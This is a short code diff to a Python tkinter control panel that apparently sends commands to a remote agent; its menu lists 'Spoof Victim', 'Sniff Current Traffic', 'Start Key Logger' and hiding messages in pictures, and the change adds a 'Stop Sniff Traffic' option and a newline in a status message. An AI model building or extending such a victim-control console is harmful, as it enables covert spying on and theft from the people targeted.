@@ -111,7 +111,7 @@ class Adder(ttk.Frame):
     def exec_func(self):
         self.server.set_todo('func Components.dll ' + self.var.get().replace(" ", "") + " " + self.e.get())
         self.answer_frame.configure(state='normal')
-        self.answer_frame.insert(tkinter.INSERT, "Please wait until get response from the agent...")
+        self.answer_frame.insert(tkinter.INSERT, "Please wait until get response from the agent...\n")
         self.answer_frame.configure(state='disabled')
 
     def init_gui(self):
@@ -146,6 +146,7 @@ class Adder(ttk.Frame):
             "Spoof Victim",
             "Stop Spoofing Victim",
             "Sniff Current Traffic",
+            "Stop Sniff Traffic",
             "Start Key Logger",
             "Stop Key Logger",
             "Hide Message In Picture",
